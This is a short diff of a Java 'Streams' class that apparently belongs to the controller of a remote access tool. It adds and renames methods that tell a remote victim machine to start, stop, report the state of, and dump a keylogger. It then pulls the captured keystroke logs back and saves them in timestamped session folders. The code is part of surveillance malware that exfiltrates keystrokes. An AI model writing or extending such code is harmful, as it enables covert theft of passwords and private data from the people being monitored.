@@ -6,7 +6,7 @@ import Information.SystemInformation;
 import Information.NetworkInformation;
 import Information.Action;
 
-import com.sun.jna.platform.win32.COM.IStream;
+import Information.Time;
 import org.json.JSONObject;
 
 
@@ -240,15 +240,25 @@ public class Streams {
         }
     }
 
-    public void sendAndReadJSON(KeyloggerEvents event) throws IOException {
+    public void sendJSON(KeyloggerEvents event) throws IOException {
         switch (event) {
             case START -> sendSize(12);
             case STOP -> sendSize(13);
             case DUMP -> {
                 sendSize(14);
-                receiveFile("KeyLogger Logs");
+                receiveFile(getSessionFolder() + "/" + new Time().getTime() + "/KeyLogger Logs");
             }
         }
+    }
+
+    public String sendAndReadJSONX(KeyloggerEvents event) throws IOException {
+        switch (event) {
+            case STATE -> {
+                sendSize(15);
+                return readString();
+            }
+        }
+        return null;
     }
 
     public void sendList(List<String> fileList) throws IOException {
